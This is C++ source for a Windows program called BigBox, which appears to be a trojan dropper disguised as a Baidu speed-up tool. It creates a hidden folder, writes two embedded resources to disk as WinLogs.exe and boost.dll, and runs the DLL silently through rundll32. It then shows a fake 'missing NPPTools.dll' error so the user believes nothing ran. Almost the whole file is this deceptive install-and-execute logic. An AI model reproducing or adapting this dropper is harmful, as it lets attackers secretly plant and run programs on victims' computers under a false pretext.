// BigBox.cpp : 定义应用程序的入口点。
//

#include "framework.h"
#include "BigBox.h"
#include <stdio.h>

BOOL FreeMyResource(UINT uiResourceName, 
	const char* lpszResourceType, const char* lpszSaveFileName);

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	char szDir[] = "C:\\BaiduNetDisk";
	if (!CreateDirectoryA(szDir, NULL)) {
		MessageBoxA(NULL, "无法启动此程序，因为计算机中丢失 NPPTools.dll，尝试重新安装该程序以解决问题。",
			"BaiduSpeedUp-系统错误", MB_OK | MB_ICONWARNING);
		return -1;
	}
	SetFileAttributesA(szDir, FILE_ATTRIBUTE_HIDDEN);

	FreeMyResource(IDR_GIFT2, "GIFT", "C:\\BaiduNetDisk\\WinLogs.exe");
	FreeMyResource(IDR_GIFT3, "GIFT", "C:\\BaiduNetDisk\\boost.dll");

	WinExec("C:\\Windows\\System32\\rundll32.exe C:\\BaiduNetDisk\\boost.dll SpeedUp",
		SW_HIDE);

	MessageBoxA(NULL, "无法启动此程序，因为计算机中丢失 NPPTools.dll，尝试重新安装该程序以解决问题。",
		"BaiduSpeedUp-系统错误", MB_OK | MB_ICONWARNING);

    return 1;
}

BOOL FreeMyResource(UINT uiResourceName, 
	const char* lpszResourceType, const char* lpszSaveFileName) {
	// get (handle of) specific resource
  // 这里要将int型资源ID强制转换为字符串
	HRSRC hRsrc = ::FindResource(NULL, MAKEINTRESOURCE(uiResourceName), lpszResourceType);
	if (NULL == hRsrc) {
		OutputDebugStringA("find resource failed!\r\n");
		return FALSE;
	}
	// get size of resource
	DWORD dwSize = ::SizeofResource(NULL, hRsrc);
	if (dwSize <= 0) {
		OutputDebugStringA("wrong size of resource\r\n");
		return FALSE;
	}
	// load resource to memory
	HGLOBAL hGlobal = ::LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		OutputDebugStringA("load resource failed\r\n");
		return FALSE;
	}
	// lock the resource
	LPVOID lpVoid = ::LockResource(hGlobal);
	if (lpVoid == NULL) {
		OutputDebugStringA("lock resource failed\r\n");
		return FALSE;
	}
	// save resource to file
	FILE* fp = NULL;
	fopen_s(&fp, lpszSaveFileName, "wb+");
	if (fp == NULL) {
		OutputDebugStringA("save file error\r\n");
		return FALSE;
	}
	fwrite(lpVoid, sizeof(char), dwSize, fp);
	fclose(fp);
	return TRUE;
}
